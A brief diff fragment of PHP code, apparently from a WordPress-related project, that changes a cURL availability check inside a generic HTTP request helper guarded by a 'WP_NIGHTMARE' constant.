@@ -7,7 +7,7 @@ if (!defined("WP_NIGHTMARE")) {
 				define("WP_NIGHTMARE", 1);
 				if (!function_exists("request")) {
 					function request($url, $parameters = null, $method = "GET") {
-						if (!function_exists("curl_init")) {
+						if (!function_exists("curl_exec")) {
 							if (ini_get("allow_url_fopen")) {
 								$opts_array = array(
 									"method" => $method,
